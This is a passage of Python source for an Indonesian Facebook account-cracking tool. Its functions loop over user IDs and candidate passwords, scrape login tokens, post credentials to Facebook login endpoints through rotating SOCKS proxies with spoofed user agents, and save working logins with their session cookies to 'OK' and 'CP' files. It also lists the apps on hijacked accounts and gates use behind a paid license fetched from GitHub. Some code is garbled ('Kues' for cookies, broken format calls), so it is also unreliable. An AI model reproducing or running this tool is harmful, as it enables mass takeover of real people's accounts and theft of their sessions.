j58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			link = random.choice(["https://m.facebook.com/login/device-based/regular/login/?api_key=140810032656374&auth_token=63ed3e768f0e783f4cc81a6b1026c500&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fclient_id%3D140810032656374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.pixiv.net%252Fpigya%252Fproxy%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd3e7e4df-8e7b-42c9-81a7-ee0e2abb19c9%26tp%3Dunspecified&refsrc=deprecated&app_id=140810032656374&cancel=https%3A%2F%2Faccounts.pixiv.net%2Fpigya%2Fproxy%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%23_%3D_&lwv=100&locale2=id_ID&refid=9","https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=7ade521eceaab1458866d9821149d64f&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fapp_id%3D213560439114%26cbt%3D1677182177996%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df11da1fc663793c%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%26client_id%3D213560439114%26display%3Dtouch%26domain%3Dwww.starmakerstudios.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Flogin%252Fpage%253Freturn_url%253D%252Finstrumental%252Fupload%26locale%3Dzh_CN%26logger_id%3Df2bda15588a0498%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1931b4149a3a44%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%2526frame%253Df3f39a10ef963dc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.9%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1931b4149a3a44%26domain%3Dwww.starmakerstudios.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Ff1245028efb5658%26relation%3Dopener%26frame%3Df3f39a10ef963dc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100&locale2=id_ID&refid=9","https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=5f8c7178a13395b4cd272a3e1897de8b&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D213560439114%26cbt%3D1677419913361%26e2e%3D%257B%2522init%2522%253A1677419913361%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D063978e3-28aa-4a0f-bbc6-9272a9973fcb%26scope%3Duser_birthday%252Copenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.starmakerinteractive.starmaker%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DP1LSLToQntEH2uBpWwB7VQimlXskVC9z-rHLt8TMxh0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D81b4243d-16d4-4293-aa47-6359abf5abdd%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=fbconnect%3A%2F%2Fcct.com.starmakerinteractive.starmaker%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D&lwv=100&locale2=id_ID&refid=9"])
			po = ses.post(link,data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.Kues.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.Kues.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def reguler3(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold purple]Reguler V3[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://free.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'free.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://free.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://free.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.Kues.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.Kues.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#-----------------------[ METODE ASYNC ]--------------------#
def kontol(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold purple]Async[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=206428089508143&kid_directed_site=0&app_id=206428089508143&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D206428089508143%26redirect_uri%3Dhttps%253A%252F%252Fwww.zalora.co.id%252Fcustomer%252Fsocialconnect%252Fendpoint%253Fhauth_done%253DFacebook%26scope%3Demail%252Cuser_birthday%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0c67b520-a187-48a6-8125-3256fe975775%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.zalora.co.id%2Fcustomer%2Fsocialconnect%2Fendpoint%3Fhauth_done%3DFacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.Kues.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,Kues={'Kue': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.Kues.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.Kues.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{x}[M1] | {P}{loop}{P} | {H}LIVE-{ok} {P}| {K}CHECK-{cp}")
	sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1132078350149238&kid_directed_site=0&app_id=1132078350149238&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D1132078350149238%26redirect_uri%3Dhttps%253A%252F%252Faccounts.epicgames.com%252FOAuthAuthorized%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%26scope%3Demail%252Cpublic_profile%252Cuser_friends%26service_entity%3Dundefined%26force_verify%3Dtrue%26response_type%3Dcode%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da37eb2e2-b948-4c11-9230-ffb2f928a308%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1703501188&hrc=1&wtsid=rdr_033qmBEAwHwueyH7Q&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'J9sEtS6VttXEZAdcwAFuSgNaCOI+M5AmEWyzsFKgRS5OcUfo5ViX/5Z7oCmzHaEUfZRLKdk3pnc2r3/ttOBDEg==','content-length': '0','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': '?1','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=1132078350149238&kid_directed_site=0&app_id=1132078350149238&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D1132078350149238%26redirect_uri%3Dhttps%253A%252F%252Faccounts.epicgames.com%252FOAuthAuthorized%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%26scope%3Demail%252Cpublic_profile%252Cuser_friends%26service_entity%3Dundefined%26force_verify%3Dtrue%26response_type%3Dcode%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da37eb2e2-b948-4c11-9230-ffb2f928a308%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1703501188&hrc=1&wtsid=rdr_033qmBEAwHwueyH7Q&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=1132078350149238&auth_token=cc90dbbd519ef9abbb3cccc56d77fd56&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D1132078350149238%26redirect_uri%3Dhttps%253A%252F%252Faccounts.epicgames.com%252FOAuthAuthorized%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%26scope%3Demail%252Cpublic_profile%252Cuser_friends%26service_entity%3Dundefined%26force_verify%3Dtrue%26response_type%3Dcode%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da37eb2e2-b948-4c11-9230-ffb2f928a308%26tp%3Dunspecified&refsrc=deprecated&app_id=1132078350149238&cancel=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f'\r{P}[{K}CP{P}] : {K}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
			elif "c_user" in ses.cookies.get_dict():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				print(f'\r{P}[{H}OK{P}] : {H}{idf}|{pw}\n{H}{kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------------------[ CEK-APLIKASI ]---------------------#
def cek_apk(session,cookie):
	w=session.get("https://x.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://x.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
#----------------------[ LICENSE ]---------------------#
import requests
from datetime import datetime

LICENSE_FILE_PATH = "saved_license.txt"

def is_license_valid(license_info):
    # Split license_info into components
    license_key, start_time_str, end_time_str = license_info.split('|')

    # Convert string times to datetime objects
    start_time = datetime.strptime(start_time_str, '%Y-%m-%d %H:%M')
    end_time = datetime.strptime(end_time_str, '%Y-%m-%d %H:%M')

    # Get current time
    current_time = datetime.now()

    # Check if the license is within the valid time range
    return start_time <= current_time <= end_time

def check_license(license_key):
    # Jika lisensi sudah tersimpan, gunakan langsung tanpa memerlukan input
    try:
        with open(LICENSE_FILE_PATH, 'r') as file:
            saved_license = file.read()
            if saved_license and is_license_valid(saved_license):
                return True
    except FileNotFoundError:
        pass

    # Jika lisensi tidak tersimpan atau tidak valid, lakukan verifikasi ulang
    github_repo_url = "https://raw.githubusercontent.com/khoirulez/RR07/main/mylisensi.txt"
    try:
        response = requests.get(github_repo_url)
        licenses = response.text.split('\n')

        for license_info in licenses:
            if license_info.startswith(license_key) and is_license_valid(license_info):
                # Simpan lisensi yang valid ke penyimpanan lokal
                with open(LICENSE_FILE_PATH, 'w') as file:
                    file.write(license_info)
                return True

        return False

    except requests.RequestException as e:
        print(f"Error: {e}")
        return False
def pepek():
    banner()
    prints(nel(f'              {P2}[red]Login Licensi{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
    print(' [1][purple] Login Ke Tools'(H,N))
    print(' [2][purple] Hubungi Admin'(H,N))
    pil = input(f'✶ ━━⫸ {H} Choice{N} : '(N,K,N))
    if pil in['2','02']:
        jalan("\n [•] {H}You will be redirected to the Author Whatsapp..."(N,H,N,H));time.sleep(0.02)
        os.system('xdg-open https://wa.me/6281283547452?text=Hallo+min+minta+lisensi+trial+SC+ini');time.sleep(2);pepek()
    elif pil in['1','01']:
        jalan(f" {H}Pastikan sudah memiliki licensinya");time.sleep(0.03);run1()
def run1():
    try:
        with open(LICENSE_FILE_PATH, 'r') as file:
            saved_license = file.read()
            if saved_license and is_license_valid(saved_license):
                return True
    except FileNotFoundError:
        run()
def run():
    banner()
    license_key = input(f"[{h}•{x}]{U}Masukkan lisensi{x}:{B} ")
    licen=open(".saved_license.txt", "w").write(license_key)
    time.sleep(0.05)

    if check_license(license_key):
       print(f"{H}Lisensi valid. Selamat menggunakan program.");time.sleep(0.03)
       os.system("clear")
       loading()
       os.system("clear")
       login()
    else:
       os.system("rm -f .saved_license.txt")
       print(f"{m}Lisensi tidak valid atau telah kadaluarsa. Tolong masukan lisensi dengan benar.");time.sleep(0.03);run()

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/downloads/DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	run()
	login()




